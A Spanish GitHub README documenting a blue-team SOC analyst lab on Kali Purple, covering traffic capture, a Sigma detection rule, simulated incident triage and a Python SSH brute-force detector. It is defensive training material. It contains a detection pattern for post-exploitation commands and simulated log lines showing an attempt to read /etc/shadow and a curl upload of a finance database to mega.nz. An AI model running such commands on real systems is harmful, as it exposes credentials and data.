![](/img/banner_kali.jpg)

# Kali-Purple-SOC-Ops - Suite Defensiva SOC L1

Este repositorio es la continuación operativa de **Linux-SOC-Labs**. Aquí documento el despliegue y uso de la suite defensiva de **Kali Purple** orientado al rol de **SOC Analyst L1 / Blue Team**. Enfocado en Detect, Protect y Respond.

<p align="center">
  <img src="https://img.shields.io/badge/M1-DESPLIEGUE-c5a3ff?style=for-the-badge" />
  <img src="https://img.shields.io/badge/M2-TRÁFICO-c5a3ff?style=for-the-badge" />
  <img src="https://img.shields.io/badge/M3-DETECCIÓN-c5a3ff?style=for-the-badge" />
  <img src="https://img.shields.io/badge/M4-TRIAGE-c5a3ff?style=for-the-badge" />
  <img src="https://img.shields.io/badge/M5-SOAR_AUTOMATIZACIÓN-c5a3ff?style=for-the-badge" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Purple-557C94?style=flat&logo=kalilinux&logoColor=white" />
  <img src="https://img.shields.io/badge/Python-3776AB?style=flat&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/Bash-4EAA25?style=flat&logo=gnubash&logoColor=white" />
  <img src="https://img.shields.io/badge/SOC_L1-Defend_Monitor_Respond-c5a3ff" />
</p>

---
## Módulo 1: Despliegue, Auditoría y Verificación del Entorno [Completado]

<details open>
<summary><b>Objetivo: Dejé mi estación L1 operativa - audité 4 herramientas y validé captura en vivo</b></summary>

#### Descripción General
Auditoría de la suite defensiva nativa de **Kali Purple**. Resolución de dependencias faltantes y validación de captura en vivo para habilitar operaciones SOC L1.

#### Comandos y Herramientas Utilizadas
```bash
# 1. Verificación de binarios defensivos nativos
which tshark tcpdump ufw

# 2. Actualización e instalación fase Protect
sudo apt update && sudo apt install ufw -y

# 3. Despliegue forense fase Respond (repo oficial)
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3 && python3 vol.py --help

# 4. Validación de captura en vivo
sudo tshark -i any -c 10
```

#### Matriz de Herramientas Auditadas
| Herramienta | NIST | Estado | Uso en SOC L1 |
| :--- | :---: | :---: | :--- |
| **Tshark** | Detect | ![Verificado](https://img.shields.io/badge/Verificado-c5a3ff) | Inspección y filtrado de tráfico .pcap |
| **Tcpdump** | Detect | ![Verificado](https://img.shields.io/badge/Verificado-c5a3ff) | Captura rápida en interfaces |
| **Volatility 3** | Respond | ![Clonado](https://img.shields.io/badge/Clonado-c5a3ff) | Análisis forense de memoria RAM |
| **UFW** | Protect | ![Instalado](https://img.shields.io/badge/Instalado-c5a3ff) | Contención por reglas de firewall |

#### Evidencia de Análisis
<p align="center">
  <img src="./img/tshark-evidencia.jpg" width="85%" alt="Evidencia Tshark 10 paquetes" />
</p>

> **Validación:** Captura de 10 paquetes con `tshark -i any -c 10`. Timestamp correcto, IP origen `10.0.2.15`, resolución DNS hacia `8.8.8.8` y tráfico TCP `443`. Estación L1 operativa.

#### Resultado
**Estación Kali Purple L1 operativa.** Binarios de Detect y Protect verificados. Herramienta de Respond aprovisionada manualmente por conflicto de firmas GPG en repos por defecto. Lista para Módulo 2.

</details>

---

## Módulo 2: Análisis de Tráfico de Red [Completado]

<details>
<summary><b>Objetivo: Dejé mi captura lista - capturé 13 paquetes HTTP y validé User-Agent en claro</b></summary>

### Descripción General
Captura y análisis de tráfico HTTP con `tcpdump` para trazar una petición web completa y validar la exposición de User-Agent en texto claro. Generación de `.pcap` como evidencia forense L1.

### Comandos y Herramientas Utilizadas
```bash
# 1. Captura y guardado de tráfico HTTP
sudo tcpdump -i eth0 -w captura_modulo2.pcap 'tcp port 80'

# 2. Generación de petición con User-Agent personalizado (segunda pestaña)
curl -A "Nikto-Test-SOC" http://httpbin.org/get

# 3. Lectura y validación del .pcap
tcpdump -nn -r captura_modulo2.pcap

# 4. Filtrado de paquetes con payload real
tcpdump -nn -r captura_modulo2.pcap 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# 5. Inspección en claro para validar cabecera
tcpdump -A -nn -r captura_modulo2.pcap 'tcp port 80'
```

### Secuencia de Paquetes y Trazabilidad
| Evento / Paquete | Flags | Descripción Técnica |
| :--- | :---: | :--- |
| **Inicio de sesión** | `[S]`, `[S.]`, `[.]` | Handshake completo SYN / SYN-ACK / ACK |
| **Petición HTTP** | `[P.]` | Envío `GET` con `User-Agent: Nikto-Test-SOC` en claro |
| **Respuesta** | `[P.] 200 OK` | Servidor responde JSON |
| **Cierre** | `[F.]`, `[.]` | Terminación ordenada TCP |

### Evidencia de Análisis
<p align="center">
  <img src="./img/tcpdump.evidencia.jpg" width="85%" alt="Evidencia tcpdump 13 paquetes" />
</p>

> **Validación:** Archivo `captura_modulo2.pcap` con 13 paquetes validados. Flujo completo capturado y cabecera `Nikto-Test-SOC` verificada con flag `-A` en texto plano.

### Resultado
**Tráfico HTTP capturado y validado.** Tuve que ajustar la interfaz y usar `-A` para ver el User-Agent en claro. Se logró generar, guardar e inspeccionar el `.pcap` con 13 paquetes como evidencia L1. Listo para Módulo 3.

</details>

---


## Módulo 3: Análisis de Amenazas, Logs & Reglas Defensivas [Completado]

<details>
<summary><b>Objetivo: Dejé mi lab de detección listo - traduje 1 regla Sigma a grep y validé 3 comandos de post-explotación</b></summary>

### Descripción General
Creación y traducción de reglas de detección con **Sigma** para estandarizar lógica fuera de SIEM comercial. Resolución de dependencias rotas de `sigmatools` aislando entorno y validación de la regla mediante conversión a patrón ejecutable en terminal.

### Comandos y Herramientas Utilizadas
```bash
# 1. Configuración de entorno aislado para sigmatools
python3 -m venv venv
source venv/bin/activate
pip install setuptools sigmatools

# 2. Traducción de regla YAML a patrón ejecutable
sigmac -t grep regla_prueba.yml

# 3. Generación de logs de prueba con actividad normal y maliciosa
echo -e "usuario ejecutando cat /etc/passwd\noperacion normal\nuname -a ejecutado" > tus_logs.txt

# 4. Validación de detección con patrón generado
grep -P -i '^(?:.*.*cat /etc/passwd.*|.*.*uname -a.*|.*.*id.*)' tus_logs.txt
```

### Regla y Patrón Generado
| Fase | Artefacto | Detalle |
| :--- | :--- | :--- |
| **Regla origen** | `regla_prueba.yml` | Detección de post-explotación `cat /etc/passwd`, `uname -a`, `id` |
| **Traducción** | `sigmac -t grep` | Conversión a regex ejecutable en terminal |
| **Patrón final** | `grep -P -i` | `^(?:.*.*cat /etc/passwd.*\|.*.*uname -a.*\|.*.*id.*)` |

### Matriz de Herramientas Auditadas
| Herramienta | NIST | Estado | Uso en SOC L1 |
| :--- | :---: | :---: | :--- |
| **Sigma / Sigmac** | Detect | <img src="https://img.shields.io/badge/Traducido-c5a3ff" /> | Estandarización de reglas sin SIEM |
| **Python venv** | N/A | <img src="https://img.shields.io/badge/Aislado-c5a3ff" /> | Resolución de dependencias descontinuadas |
| **Grep -P** | Detect | <img src="https://img.shields.io/badge/Validado-c5a3ff" /> | Validación de detección en logs |

### Evidencia de Análisis
<p align="center">
  <img src="./img/evidencia-sigma.jpg" width="85%" alt="Evidencia Sigma a grep" />
</p>

> **Validación:** Entorno virtual activo, conversión exitosa de `regla_prueba.yml` a patrón grep y filtrado correcto de 2 líneas maliciosas sobre `tus_logs.txt`. Detección funcional sin SIEM.

### Resultado
**Regla defensiva operativa en terminal.** Aislé dependencias rotas con venv y dejé la lógica de detección validada en logs reales. Patrón listo para escalar a SIEM en Módulo 4.

</details>

---


## Módulo 4: Gestión, Triage y Documentación de Incidentes SOC L1 [Completado]

<details>
<summary><b>Objetivo: Dejé mi triage listo - clasifiqué 3 alertas con 2 VP y 1 FP, con 1 escalamiento a L2</b></summary>

### Descripción General
Triage y documentación de 3 alertas simuladas como analista L1. Clasificación entre verdadero positivo y falso positivo, contención inmediata en L1 y criterio de escalamiento a L2 por exfiltración de datos.

### Matriz de Incidentes (Resumen Ejecutivo)
| Ticket | Severidad | Clasificación | Estado | Acción L1 |
| :--- | :---: | :---: | :---: | :--- |
| **SOC-INC-2026-001** | Crítica | <img src="https://img.shields.io/badge/VP_Verdadero_Positivo-ff6b6b" /> | <img src="https://img.shields.io/badge/Cerrado-c5a3ff" /> | Bloqueo de cuenta |
| **SOC-INC-2026-002** | Crítica | <img src="https://img.shields.io/badge/VP_Exfiltracion-ff6b6b" /> | <img src="https://img.shields.io/badge/Escalado_L2-ffa500" /> | Aislamiento + Escalamiento |
| **SOC-INC-2026-003** | Baja | <img src="https://img.shields.io/badge/FP_Legitimo-4caf50" /> | <img src="https://img.shields.io/badge/Cerrado-c5a3ff" /> | Cierre sin contención |

### Ticket #1: Acceso No Autorizado a Archivos Críticos
**ID:** `SOC-INC-2026-001` | **Fecha:** `2026-10-18T20:15:00Z` | **Host:** `SOC-PC-01`

**Resumen:** Usuario `invitado_01` sin privilegios intentó leer `/etc/shadow` vía `sudo cat`. Archivo con hashes de contraseñas, marcado crítico.

**Evidencia (Raw Log):**
```text
2026-10-18T20:15:00Z SOC-PC-01 sudo: invitado_01 : TTY=pts/1 ; PWD=/home/invitado_01 ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
```

**Acción L1:**
1. Bloqueo inmediato de `invitado_01`
2. Revisión de `/etc/sudoers` por mala configuración
3. Notificación a sysadmin

### Ticket #2: Detección y Exfiltración de Datos (Escalamiento a L2)
**ID:** `SOC-INC-2026-002` | **Fecha:** `2026-10-18T03:30:00Z` | **Host:** `SOC-FINANCE-01`

**Resumen:** Actividad fuera de horario. Cuenta `admin_maint` ejecuta escaneo `nmap -sS -p 1-65535 192.168.1.0/24` y exfiltra `db_finance.zip` a `mega.nz` con `curl`.

**Evidencia (Raw Log):**
```text
2026-10-18T03:30:12Z SOC-FINANCE-01 bash_history: admin_maint : COMMAND=nmap -sS -p 1-65535 192.168.1.0/24
2026-10-18T03:32:45Z SOC-FINANCE-01 bash_history: admin_maint : COMMAND=curl -F "file=@/var/backups/db_finance.zip" https://mega.nz/upload
```

**Acción L1 -> L2:**
1. **Contención L1:** Aislamiento de `SOC-FINANCE-01` de la red para cortar exfiltración
2. **Escalamiento:** A L2/IR por exfiltración confirmada y posible movimiento lateral

### Ticket #3: Script de Mantenimiento Legítimo (Falso Positivo)
**ID:** `SOC-INC-2026-003` | **Fecha:** `2026-10-18T14:15:00Z` | **Severidad:** Baja

**Resumen:** Alerta por `actualizar_firmas.ps1` en equipo de marketing. Validado con TI como despliegue autorizado.

**Acción y Cierre:**
* Validado en canal oficial `#it-ops` con cambio `CR-8492`
* Cierre como FP, sin contención

### Resultado
**Triage L1 completado.** Dejé 3 incidentes documentados con evidencia, contención y criterio de escalamiento. 2 VP cerrados/escalados y 1 FP validado. Flujo listo para reporte ejecutivo.

</details>

---

## Módulo 5: Playbooks de Respuesta a Incidentes y Automatización con Python (SOAR L1) [Completado]

<details>
<summary><b>Objetivo: Dejé mi playbook SOAR listo - documenté IR-01 bajo NIST y automatizé detección de brute force SSH en Python</b></summary>

### Descripción General
Integración de la teoría de respuesta a incidentes **NIST SP 800-61** con automatización práctica en Python para optimizar las funciones de SOC L1. Playbook estandarizado + script SOAR que detecta, correlaciona y propone contención.

### 1. Marco Teórico: Playbook IR-01 - Fuerza Bruta SSH
**MITRE ATT&CK:** `T1110 - Brute Force` | **NIST:** Respond

| Fase NIST | Acción L1 | Herramienta |
| :--- | :--- | :--- |
| **Preparación** | Auditoría `/var/log/auth.log` + reglas firewall | `auditd`, `ufw` |
| **Detección y Análisis** | Monitoreo `Failed password` repetitivo | `grep`, `soar_l1_responder.py` |
| **Contención** | Aislamiento IP origen | `sudo ufw deny from <IP> to any` |
| **Erradicación** | Auditoría logins exitosos desde IP maliciosa | `auth.log`, `lastlog` |
| **Post-Incidente** | Ticket + actualización blocklist persistente | Documentación |

### 2. Automatización SOC L1 con Python
Script que analiza logs, extrae IPs con regex, evalúa umbral y genera comando de mitigación sin bloqueo automático en producción (criterio L1).

**Log de prueba (`prueba_log.txt`):**
```text
Oct 18 20:15:01 SOC-PC-01 sshd[1234]: Failed password for root from 192.168.1.105 port 22
Oct 18 20:15:03 SOC-PC-01 sshd[1234]: Failed password for root from 192.168.1.105 port 22
Oct 18 20:15:05 SOC-PC-01 sshd[1234]: Failed password for root from 192.168.1.105 port 22
```

**Código (`soar_l1_responder.py`):**
```python
#!/usr/bin/env python3
import re, os
from collections import Counter

FAILED_AUTH_PATTERN = r"Failed password for .* from (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
UMBRAL_ALERTA = 3

def analizar_logs(log_path="prueba_log.txt"):
    if not os.path.exists(log_path):
        print(f"[!] Log no encontrado: {log_path}")
        return
    print(f"[*] Leyendo {log_path}...")
    with open(log_path, 'r', errors='ignore') as f:
        contenido = f.read()

    ips = re.findall(FAILED_AUTH_PATTERN, contenido)
    conteo = Counter(ips)

    print("\n[+] Resultados del analisis:")
    for ip, cantidad in conteo.items():
        if cantidad >= UMBRAL_ALERTA:
            print(f"    ALERTA: IP sospechosa: {ip} ({cantidad} intentos fallidos)")
            print(f"    [ACCION SOAR L1]: sudo ufw deny from {ip} to any")
        else:
            print(f"    IP en observacion: {ip} ({cantidad} intentos)")

if __name__ == "__main__":
    analizar_logs()
```

### Matriz de Herramientas Auditadas
| Herramienta | NIST | Estado | Uso en SOC L1 |
| :--- | :---: | :---: | :--- |
| **Python + Regex** | Detect | <img src="https://img.shields.io/badge/Automatizado-c5a3ff" /> | Extracción y correlación de IPs |
| **UFW** | Contain | <img src="https://img.shields.io/badge/Propuesta-c5a3ff" /> | Comando de contención SOAR L1 |
| **Playbook IR-01** | Respond | <img src="https://img.shields.io/badge/Documentado-c5a3ff" /> | Procedimiento estándar NIST |

### Evidencia de Análisis
<p align="center">
  <img src="./img/evidencia-python.png" width="85%" alt="Evidencia SOAR L1 Python" />
</p>

> **Validación:** Script ejecutado sobre `prueba_log.txt`. Detección de `192.168.1.105` con 3 intentos fallidos. Umbral superado y comando `ufw deny` generado correctamente. Lógica SOAR L1 funcional.

### Resultado
**Playbook IR-01 operativo y automatizado.** Documenté flujo NIST completo y dejé script Python que pasa de detección manual a detección automática con criterio L1. Cierre del ciclo Detect -> Respond listo para producción SOC.

</details>

---
